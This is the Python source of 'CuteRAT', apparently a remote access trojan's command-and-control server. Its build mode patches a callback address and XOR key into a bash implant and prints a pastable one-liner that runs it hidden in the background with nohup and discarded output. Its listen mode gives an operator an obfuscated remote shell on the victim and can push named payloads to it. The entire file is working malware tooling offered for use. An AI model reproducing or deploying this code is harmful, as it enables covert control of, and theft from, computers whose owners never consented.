import os
import re
import sys
import glob
import socket
import binascii
import argparse
import readline

VERSION = '0.1'

def str_to_hex(s):
    return binascii.hexlify(s.encode()).decode()

def hex_to_str(s):
    return binascii.unhexlify(s).decode()

def xor(plain, key):
    buf = ''
    for i, c in enumerate(plain):
        buf += '{:x}'.format(int(c, 16) ^ int(key[i % len(key)], 16))
    return buf

def load_payload(payload_name, payloads_dir, payload_args):
    # TODO: ignore comment lines
    with open(f'{payloads_dir}/{payload_name}', 'r') as fh:
        payload = fh.read()
    payload = re.sub(r'^#.*\n', '', payload, flags=re.MULTILINE)
    for i, arg in enumerate(payload_args):
        if f'@{i+1}@' in payload:
            payload = payload.replace(f'@{i+1}@', arg)
        else:
            break
    return payload

def get_list_of_payloads(payloads_dir):
    files = glob.glob(f'{payloads_dir}/*')
    return [os.path.basename(f) for f in files]

def get_payload_help(payload_name, payloads_dir):
    files = glob.glob(f'{payloads_dir}/*')
    with open(f'{payloads_dir}/{payload_name}', 'r') as fh:
        payload = fh.read().splitlines()
    help_lines = []
    for line in payload:
        if line.startswith('# help') or line.startswith('#help'):
            help_lines.append(line)
    return help_lines

parser = argparse.ArgumentParser(description='CuteRAT C2')
parser.add_argument('mode', choices=('build', 'listen'), nargs='?', help='Which mode to run in. "build" generates a new RAT, "listen" waits for a new connection')
parser.add_argument('-b', '--bind', required=True, help='What ip:port to bind the listener to')
parser.add_argument('-k', '--key', required=True, help='XOR key to use for communicating with CuteRAT. Hex string format of 8 bytes')
parser.add_argument('-p', '--payloads', default='./payloads/', help='Where payloads are stored.')
args = parser.parse_args()

bind_ip, bind_port = args.bind.split(':')
if len(args.key) != 8:
    print('XOR key length must be 8 hex characters long')
    sys.exit(1)
try: 
    int(args.key, 16)
except ValueError:
    print('XOR key must only contain hex digits [01234567890abcdef]')
    sys.exit(1)

if args.mode == 'listen' and not os.path.isdir(args.payloads):
    print(f'{args.payloads} directory doesn\'t exist')
    sys.exit(1)

print('')
print('█▀▀ █░█ ▀█▀ █▀▀ █▀█ ▄▀█ ▀█▀')
print('█▄▄ █▄█ ░█░ ██▄ █▀▄ █▀█ ░█░')
print(f'version {VERSION} - by @nopcorn')
print('')

if args.mode == 'build':
    print(f'Building CuteRAT with callback "{bind_ip}:{bind_port}" and key "{args.key}"')
    with open('cuterat.sh', 'r') as f:
        cuterat = f.read()
    tmp = re.sub(r'\n', '', cuterat)
    tmp = tmp.replace('@KEY@', args.key)
    tmp = tmp.replace('@C2_IP@', bind_ip)
    tmp = tmp.replace('@C2_PORT@', bind_port)
    cuterat_minified = re.sub(r'\s+', ' ', tmp)
    pastable = f'nohup bash >/dev/null 2>&1 << \'EOF\' &\n{cuterat_minified}\nEOF'
    print(f'Pastable runner ({len(pastable)} bytes):')
    print('')
    print(pastable)
    print('')
    pass
elif args.mode == 'listen':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((bind_ip, int(bind_port)))
    s.listen(1)
    print(f'Listening for connections on {bind_ip}:{bind_port}')

    c, address = s.accept()
    print(f'Accepted connection from {address}')
    while True:
        cmd = input(f'{address[0]}:{address[1]} # ')
        if cmd == '': continue

        if cmd[0] == '~':
            payload_name, *payload_args = cmd[1:].strip().split(' ', 1)
            payload_args = payload_args if payload_args else []
            if payload_name == 'help':
                if len(payload_args) == 0:
                    payloads = get_list_of_payloads(args.payloads)
                    print('')
                    print('Available payloads:')
                    for payload in payloads:
                        print(f'  {payload}')
                    print('')
                    print('To get help on a specific payload, run ~help <payload>')
                else:
                    if not os.path.exists(f'{args.payloads}/{payload_args[0]}'):
                        print(f'Could not find payload: {args.payloads}/{payload_args[0]}')
                    else:
                        help_text = get_payload_help(payload_args[0], args.payloads)
                        if len(help_text) == 0:
                            print(f'No help available for {payload_args[0]}. You\'re on your own.')
                        else:
                            for line in help_text:
                                print(line)
                continue
            else:
                if not os.path.exists(f'{args.payloads}/{payload_name}'):
                    print(f'Could not find payload: {args.payloads}/{payload_name}')
                    continue
                cmd = load_payload(payload_name, args.payloads, payload_args)

        cmd_hex = str_to_hex(cmd)
        cmd_enc = xor(cmd_hex, args.key)
        cmd_enc = f'{cmd_enc}\n' # \n added as EOL for bash
        c.send(cmd_enc.encode())

        output_enc = ''
        while True:
            chunk = c.recv(1024)
            if not chunk: 
                print('CuteRAT hung up...')
                sys.exit(1)
            output_enc += chunk.decode()
            if len(chunk) < 1024:
                break
        output_enc = output_enc[:-1] # remove \n
        output_hex = xor(output_enc, args.key)
        output_plain = hex_to_str(output_hex)
        print(output_plain)
else:
    pass